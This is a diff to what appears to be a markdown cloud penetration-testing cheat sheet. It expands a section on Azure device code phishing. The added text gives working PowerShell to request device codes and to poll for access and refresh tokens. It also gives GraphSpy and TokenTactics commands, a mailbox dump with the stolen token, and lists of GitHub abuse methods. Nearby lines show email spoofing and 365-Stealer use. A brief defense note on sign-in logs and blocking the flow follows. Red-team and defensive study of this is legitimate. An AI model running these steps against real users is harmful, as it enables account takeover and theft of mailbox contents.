@@ -15,7 +15,8 @@
   * [Evilginx2](#Evilginx2)
   * [Illicit Consent Grant](#Illicit-Consent-Grant)
   * [Email Spoofing](#Email-spoofing)
-  * [Device code auth](#Device-code-auth)
+  * [Azure Device Code](#Azure-Device-Code)
+    * [Dynamic device code phishing](#Dynamic-device-code-phishing)
   * [Google workspace calendar event injection](#Google-workspace-calendar-event-injection)
 * [Public storage](#public-storage)
   * [Azure storage accounts](#Azure-storage-accounts)
@@ -57,6 +58,12 @@ Invoke-MFASweep -Username <EMAIL> -Password <PASSWORD>
   - Gitleaks https://github.com/zricethezav/gitleaks
   - Gitrob https://github.com/michenriksen/gitrob
   - Truffle hog https://github.com/dxa4481/truffleHog
+- Common abuses
+  - Secrets (Credentials, API keys, Tokens) in repositories
+  - Compromising a user with commit rights
+  - Hosting malware
+  - Abusing GitHub actions and workflows to trigger builds/execute code or perform an action
+    - Workflow can run in a VM
 
 ### Gitleaks
 - https://github.com/zricethezav/gitleaks
@@ -70,6 +77,9 @@ Invoke-MFASweep -Username <EMAIL> -Password <PASSWORD>
 ```
 https://github.com/[git account]/[repo name]/commit/[commit ID]
 ```
+
+#### GitHub Personal Access Token
+- A GitHub Personal Access Token starts with `github_pat_<TOKEN>`
 
 ## Reused access 
 - certs as private keys on web servers
@@ -332,43 +342,68 @@ python 365-Stealer.py --refresh-all
 Send-MailMessage -SmtpServer CompanyDomain-com.mail.protection.outlook.com -Subject “Subject Here” -To ‘Full Name <user2@companyDomain.com>‘ -From ‘From Full Name <user1@companyDomain.com>‘ -Body “Hello From your Co-worker” -BodyAsHtml
 ```
 
-### Device code phishing
-- Login to devices that has limited input posibility, Like a smart TV.
-- Flow
-  - Enter code on device on https://microsoft.com/devicelogin
-  - Perform normal authentication, including MFA as user
-  - On successful login the device gets access and refresh tokens
+### Azure Device Code
+- Device Code is used to login to devices that have input validations
+- Flow:
+	- Enter code on device on https://microsoft.com/devicelogin
+	- Perform normal authentication, including MFA as user
+	- On successful login the device gets access and refresh tokens
+	- [MS link](https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-device-code#protocol-diagram)
 - Links
   - https://aadinternals.com/post/phishing/
   - https://www.offsec-journey.com/post/phishing-with-azure-device-codes
   - https://www.youtube.com/watch?v=GZ_nn0uRLr4
+  - https://0xboku.com/2021/07/12/ArtOfDeviceCodePhish.html
 - Block device auth flow: https://learn.microsoft.com/en-us/entra/identity/conditional-access/how-to-policy-authentication-flows
 
-#### Request Device Code token
-- Code is only valid for 15 mi
-- Request it manually
-  - Uses version 2 of the device code auth flow
-  - Scope = all default permissions and offline access
+#### Manually request device code
+- Code is only valid for 15 minutes!
+- There are multiple methods to request device codes. A few examples below:
+- Manually version 1 API
+  - Scope = all default permissions and `offline_access`
+  - The scope `offline_access` instructs the Azure AD to return a refresh token in addition to an access token and ID token.
   - Copy the `user_code`
+  - Can replace `common` in url with `consumers`, `organizations`, `tenant ID` or `tenant domain`
+
 ```
 $ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
-$Scope = ".default offline_access"
-$GrantType = "urn:ietf:params:oauth:grant-type:device_code"
+$Resource = "https://graph.windows.net/"
 
 $body = @{
-	"client_id" = $ClientID
-	"scope" = $Scope
+	"client_id" = $ClientID 
+	"resource" = $Resource
 }
 
-$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri
-"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode" -Body $body
+$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body
 
 Write-Output $authResponse
 ```
 
-- https://github.com/rvrsh3ll/TokenTactics
+- Manually version 2 API
 ```
-ipmo .\TokenTactics-main\TokenTactics.psd1
+$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+$Scope = ".default offline_access"
+
+$body = @{
+	"client_id" = $ClientID 
+	"scope" = $Scope
+}
+
+$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" -Body $body
+
+Write-Output $authResponse
+```
+
+- Graphspy https://github.com/RedByte1337/GraphSpy
+	- Go to device codes and generate one
+```
+python.exe .\GraphSpy-master\GraphSpy\GraphSpy.py
+```
+
+
+- Tokentactics https://github.com/rvrsh3ll/TokenTactics
+```
+Import-Module .\TokenTactics.psd1
 
 Get-AzureToken -Client MSGraph
 ```
@@ -399,25 +434,41 @@ Use the Code to access the content of the website: https://microsoft.com/devicel
 Code: <CODE>
 ```
 
-#### Capture Access Token
-- Manually saves in `$GraphAccessToken`
+#### Request access token
+- Uses the device code from `$authResponse.device_code`
+- Manually version 1 API
 ```
+$GrantType = "urn:ietf:params:oauth:grant-type:device_code"
+
+$body=@{
+	"client_id" = $ClientID
+	"grant_type" = $GrantType
+	"code" = $authResponse.device_code
+	"resource" = $Resource
+}
+
+$Tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body
+$GraphAccessToken = $Tokens.access_token
+
+$GraphAccessToken
+```
+
+- Manually version 2 API
+```
+$GrantType = "urn:ietf:params:oauth:grant-type:device_code"
+
 $body=@{
 	"client_id" = $ClientID
 	"grant_type" = $GrantType
 	"code" = $authResponse.device_code
 }
-$Tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri
-"https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body -ErrorAction SilentlyContinue
+$Tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body -ErrorAction SilentlyContinue
 $GraphAccessToken = $Tokens.access_token
 
 $GraphAccessToken 
 ```
 
-- TokenTactics will capture the token. This is saved in `$response.access_token` variable.
-```
-$response.access_token
-```
+- Graph spy and token tactics automatically pulls for the access token
 
 #### Post exploitation
 - Example dump mailbox with TokenTactics:
@@ -426,8 +477,17 @@ Dump-OWAMailboxViaMSGraphApi -AccessToken $response.access_token -mailFolder
 AllItems
 ```
 
-#### Dynamic Device Code Phishing
+### Dynamic device code phishing
+- Dynamically request codes and give them to the user on a webpage to
 - https://www.blackhillsinfosec.com/dynamic-device-code-phishing/
+
+#### Defense
+- Logs
+  - Attacker IP and device that is logged in Entra ID Sign-in logs
+  - Sign in with Authentication Protocol: Device Code
+- Conditional Access
+  - Location based policy
+  - Block device code flow [Documentation](https://learn.microsoft.com/en-us/entra/identity/conditional-access/how-to-policy-authentication-flows)
 
 ### Google workspace calendar event injection
 - Silently injects events to target calendars
